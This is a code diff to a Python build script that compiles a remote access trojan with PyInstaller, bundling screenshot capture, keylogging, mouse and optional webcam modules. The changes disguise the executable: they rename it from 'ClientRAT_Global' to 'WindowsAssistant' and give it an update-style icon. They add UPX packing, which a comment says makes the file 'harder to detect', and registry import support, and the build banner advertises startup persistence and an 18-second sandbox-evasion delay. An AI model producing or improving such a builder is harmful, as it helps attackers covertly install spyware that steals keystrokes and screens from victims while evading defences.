@@ -99,13 +99,24 @@ def main():
         subprocess.check_call([sys.executable, "-m", "pip", "install", "-q"] + extra_pkgs)
         print("[+] Dependencies installed")
             
-    print("\n[*] Building executable... Please wait (this takes about 15 seconds)...")
+    print("\n[*] Building executable... Please wait (this takes about 30 seconds)...")
+    
+    exe_name = "WindowsAssistant"
+    icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "update_icon.ico")
+    upx_path  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "upx.exe")
     
     pyinstaller_cmd = [
         sys.executable, "-m", "PyInstaller",
         "--onefile",
         "--noconsole",
-        "--name", "ClientRAT_Global",
+        "--name", exe_name,
+        # ── Icon ──────────────────────────────────────────────────────────────
+        f"--icon={icon_path}",
+        # ── UPX compression (smaller .exe, harder to detect) ─────────────────
+    ]
+    if os.path.exists(upx_path):
+        pyinstaller_cmd.append(f"--upx-dir={os.path.dirname(upx_path)}")
+    pyinstaller_cmd += [
         # ── Screenshot (Pillow) ─────────────────────────────────────────────
         "--hidden-import", "PIL",
         "--hidden-import", "PIL.ImageGrab",
@@ -126,6 +137,8 @@ def main():
         "--hidden-import", "pynput.keyboard._xorg",
         "--hidden-import", "pynput.keyboard._darwin",
         "--hidden-import", "pynput.mouse",
+        # ── Registry persistence (winreg) ───────────────────────────────────
+        "--hidden-import", "winreg",
         # ── Webcam (opencv-python) — optional (adds ~50MB) ─────────────────
         #"--hidden-import", "cv2",           # Uncomment if webcam is needed
         temp_file
@@ -135,7 +148,12 @@ def main():
         subprocess.check_call(pyinstaller_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print("\n[+] ========================================= [+]")
         print("   SUCCESS! Executable successfully compiled!   ")
-        print("   Location: ./dist/ClientRAT_Global.exe        ")
+        print(f"   Name: {exe_name}.exe                         ")
+        print("   Location: ./dist/                            ")
+        print(f"   Icon: ✓ (update_icon.ico)                   ")
+        print(f"   UPX: {'YES' if os.path.exists(upx_path) else 'NO'} compressed                           ")
+        print(f"   Persistence: YES (HKCU Run on startup)        ")
+        print(f"   Delay: YES (18s sandbox evasion)              ")
         print("[+] ========================================= [+]")
     except subprocess.CalledProcessError as e:
         print(f"\n[-] Build failed (error code: {e.returncode}).")
